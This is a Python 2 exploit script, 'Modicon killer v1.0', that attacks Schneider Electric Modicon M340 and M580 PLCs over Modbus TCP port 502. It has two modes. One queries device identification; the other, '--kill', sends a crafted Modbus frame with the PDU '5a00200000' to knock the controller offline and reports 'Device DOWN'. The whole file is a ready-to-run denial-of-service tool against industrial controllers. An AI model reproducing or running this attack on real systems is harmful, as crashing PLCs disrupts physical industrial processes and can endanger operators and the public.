# -*- coding: utf-8 -*-
import time
import socket
import sys
#import random
import time
import argparse

banner = '''
	                               /$$ /$$                                    
	                              | $$|__/                                    
	 /$$$$$$/$$$$   /$$$$$$   /$$$$$$$ /$$  /$$$$$$$  /$$$$$$  /$$$$$$$       
	| $$_  $$_  $$ /$$__  $$ /$$__  $$| $$ /$$_____/ /$$__  $$| $$__  $$      
	| $$ \ $$ \ $$| $$  \ $$| $$  | $$| $$| $$      | $$  \ $$| $$  \ $$      
	| $$ | $$ | $$| $$  | $$| $$  | $$| $$| $$      | $$  | $$| $$  | $$      
	| $$ | $$ | $$|  $$$$$$/|  $$$$$$$| $$|  $$$$$$$|  $$$$$$/| $$  | $$      
	|__/ |__/ |__/ \______/  \_______/|__/ \_______/ \______/ |__/  |__/      
									                                                                          
	 /$$       /$$ /$$ /$$                                                    
	| $$      |__/| $$| $$                                                    
	| $$   /$$ /$$| $$| $$  /$$$$$$   /$$$$$$                                 
	| $$  /$$/| $$| $$| $$ /$$__  $$ /$$__  $$                                
	| $$$$$$/ | $$| $$| $$| $$$$$$$$| $$  \__/                                
	| $$_  $$ | $$| $$| $$| $$_____/| $$                                      
	| $$ \  $$| $$| $$| $$|  $$$$$$$| $$                                      
	|__/  \__/|__/|__/|__/ \_______/|__/   

		Modicon killer v1.0
'''

bannerInfo = '''
 # Exploit Title: \t"Dos Modicon via Modbus Injection" 
 # CVE: \t\t---------------
 # CVSS Base Score v3: \t8.6 / 10
 # CVSS Vector String:\tAV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H  
 # Date: \t\t2/01/2018
 # Exploit Author: \tFernandez Ezequiel ( @capitan_alfa ) && Bertin Jose ( @bertinjoseb )
 # Vendor: \t\tSchneider Electric
 # devices(tested): \tPLC Modicon m340 (v2.0 > v2.8) & m580

 '''

parser = argparse.ArgumentParser(prog='mdKiller.py',
								description=' [+] DOS Modicon via Modbus Injection.', 
								epilog='[+] Demo: mdKiller.py --sid 00 --host <target> --check/kill',
								version="1.0")

parser.add_argument('--sid', dest="SlaveID",  help='Slave ID (default 00)', default="00")
parser.add_argument('--host', dest="HOST",  help='Host',required=True)
parser.add_argument('--port', dest="PORT",  help='Port (default 502)',type=int,default=502)

parser.add_argument('--check', dest="CHECK",  help='Show device info ',action="store_true")
parser.add_argument('--kill', dest="KILL",  help='Check availability',action="store_true")

args        	= 	parser.parse_args()

HST   			= 	args.HOST
SID 			= 	str(args.SlaveID) ### ---> hex no int !!!!
portModbus		= 	args.PORT
checkDOS		= 	bool(args.CHECK)
killerPLC 		= 	bool(args.KILL)


class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT		= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'

_modbus_obj_description = {  
						0: "VendorName",	
						1: "ProductCode",	
						#2: "MajorMinorRevision",
						2: "Revision",		
						3: "VendorUrl",	
						4: "ProductName",	
						5: "ModelName",	
						#6: "UserApplicationName",
						6: "User App Name",
						7: "Reserved",	
						8: "Reserved",	
						9: "Reserved",	
						10: "Reserved",	
						128: "Private objects",
						255: "Private objects"		
}
func_code 	= '2b'  # Device Identification
meiType 	= '0e'  # MODBUS Encapsulated Interface - 0e / 0d
read_code	= '03'  # 01 / 02 / 03 / 04 
obj_id 		= '00' 

# --MBAP 7 Bytes --------------------------------------------------------  #
# Return a string with the modbus header
def create_header_modbus(length,unit_id):
    trans_id = "6464"
    proto_id = "0000"
    protoLen = length.zfill(4)
    unit_id = unit_id

    return trans_id + proto_id + protoLen + unit_id.zfill(2)

#0022000005005a00200000

modbusRequest = 	create_header_modbus('5',SID)

modbusRequest +=	func_code
modbusRequest += 	meiType
modbusRequest += 	read_code
modbusRequest += 	obj_id

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.settimeout(3)

def get_obj_DevInfo(reqMD):
	try:
		client.connect((HST,int(portModbus)))
	except Exception, e:
	 	if str(e) == "timed out":
		 	print Colors.BLUE+"\n // ------------------------------------------------- //"
			print Colors.RED+"\t [+] GAME OVER"	
			print Colors.GREEN+"\t [+] Device DOWN !!!"	
			print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT	 		
			print "\n"	
	 	else:
	 		#print str(e)
		 	print Colors.GREEN+" [+] "+str(e)+Colors.DEFAULT
		 	print Colors.BLUE+"\n // ------------------------------------------------- //"
			print Colors.RED+"\t [+] GAME OVER"	
			print Colors.GREEN+"\t [+] Device DOWN !!!"	
			print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT	
		sys.exit(0)
	
	# ------------------------------------------------------------------------------------
	request2  = Colors.RED+reqMD+Colors.DEFAULT

	client.send(reqMD.decode('hex'))

	try:
		aResponse1 = client.recv(2048)
	except Exception, e:
	 	print Colors.GREEN+str(e)+Colors.DEFAULT

	 	print Colors.BLUE+"\n // ------------------------------------------------- //"
		print Colors.RED+"\t [+] GAME OVER"	
		print Colors.GREEN+"\t [+] Device DOWN !!!"	
		print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT
	 	#print Colors.RED+"DOWN !!!"+Colors.DEFAULT
		sys.exit(0)

	#time.sleep(0.7) ###########################################################################


	resp = aResponse1.encode('hex')


	aframe  = resp
	print "\n"
	print  Colors.BLUE+' [+] Host: \t\t' +Colors.RED+HST+Colors.DEFAULT
	print  Colors.BLUE+' [+] Port: \t\t' +Colors.ORANGE+str(portModbus)+Colors.DEFAULT
	print  Colors.BLUE+' [+] Slave ID: \t\t' +Colors.RED+aframe[12:14]+Colors.DEFAULT

	respCode 	= aframe[14:16]
	totalObjs 	= aframe[26:28]
	firstObj 	= 28

	try:
		try:
			objTot = aframe[26:28]
			nObjeto = int(objTot,16)
		except:
			objTot = '0'
			nObjeto = int('0',10)

	

		print Colors.BLUE+' [+] TotalObj: \t\t'+Colors.RED+str(nObjeto)+Colors.DEFAULT
		print ''
		pInicial = 28

		for i in xrange(0,nObjeto):
			pInicial+=4
			longitud = aframe[pInicial-2:pInicial]
			longitud = int(longitud,16) 
				
						
			valueStr = aframe[pInicial:pInicial+longitud *2 ]
			objVal   = valueStr.decode("hex")

			try:
				obj_nm =_modbus_obj_description[i]
			except:
				obj_nm ='objName X'

			print Colors.BOLD+ " [*]  "+Colors.GREEN+ obj_nm +': \t'+Colors.ORANGE+objVal+Colors.DEFAULT
			pInicial+=longitud*2
	

	except Exception, e:
		print  Colors.BR_COLOUR+Colors.RED+'\n [!] no device info' + Colors.DEFAULT
		print e
		print 'fail 2'
	
	client.close()

	print "\n"

def plcKiller(pduInjection):
	reqst = {}
	reqst[0] =	create_header_modbus('5',SID)
	reqst[1] =	pduInjection

	#fnc = pduInjection #[:2]

	MB_Request = 	reqst[0]
	MB_Request +=	reqst[1]

	try:

		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.settimeout(2)
		client.connect((HST,portModbus))

	except Exception, e:

		print "GAME OVER.\nNo connection:"
	 	print e
		sys.exit(0)

	mbKiller = MB_Request.decode('hex')
	
	injection = Colors.ORANGE+mbKiller.encode("hex")+Colors.DEFAULT
	print " [+] Injection: \t"+injection

	client.send(mbKiller)
	try:
		aResponse1 = (client.recv(1024))#.encode("hex")		
		print " [+] Response: \t\t"+aResponse1.encode("hex")
		print " [+] Response(dec): \t"+aResponse1
	    #client.recv(1024)
	except Exception, e:
	 	print Colors.GREEN+str(e)+Colors.DEFAULT
		print Colors.BLUE+"\n // ------------------------------------------------- //"
		print Colors.RED+"\t [+] Vulnerable"	
		print Colors.GREEN+"\t [+] Device DOWN !!!"	
		print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT		
		sys.exit(0)

	print Colors.BLUE+"\n // ------------------------------------------------- //"
	
	print Colors.ORANGE+"\t [+] NO vulnerable"	
	print Colors.GREEN+"\t [+] Device UP !!!"	
	print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT

def main():
	print Colors.GREEN+banner+Colors.DEFAULT
	print Colors.BLUE+bannerInfo+Colors.DEFAULT


	if checkDOS == True:
		get_obj_DevInfo(modbusRequest)	

	elif killerPLC == True:
		plcKiller(pduInjection="5a00200000")

	else:

		sys.exit(0)


main()

#modicon #m580 (la joya de @SchneiderElec) tmb ha caido